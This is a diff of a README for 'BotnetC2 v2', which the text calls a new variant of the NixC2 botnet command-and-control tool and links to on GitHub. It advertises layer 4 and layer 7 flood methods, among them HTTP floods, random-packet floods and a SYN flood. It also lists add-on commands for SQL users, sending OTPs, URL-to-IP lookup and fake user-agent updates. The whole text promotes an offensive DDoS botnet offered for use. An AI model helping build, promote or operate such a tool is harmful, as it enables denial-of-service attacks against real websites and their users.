@@ -3,7 +3,9 @@
 if you can go to here:
 https://github.com/NixWasHere/NixC2
 
-# BOTNETC2
+# BOTNETC2 v2
+
+BOTNET C2 UPDATE !!! (MAKE SMALL CODE) and (SIZE BYTES PACKET NEW)
 
 BotnetC2 its new varints of NixC2
 
@@ -15,15 +17,15 @@ For -->
 LAYER4 LAYER7
 ```
 
-# NEW METHODS L4/L7
+# METHODS L4/L7
 
- L7 --> .http_all .http_dfb .http .cfb_sock
+ L7 --> .cfb_socks .http .http_sock .http_dfb .http_all
  
  L4 --> .rand_std/rand_hex/rand_vse/rand_all and syn flood back !!
 
 # ** Ex command name **
 Ex command tool
-help sql_user url_to_ip ip_to_geo
+help sql_user & otp_sent | url_to_ip | ip_to_geo | update_ua (use pip to update fakeuseragent packet in botnet) | set_prompt
   
 # HOW TO GET (OTP)
   
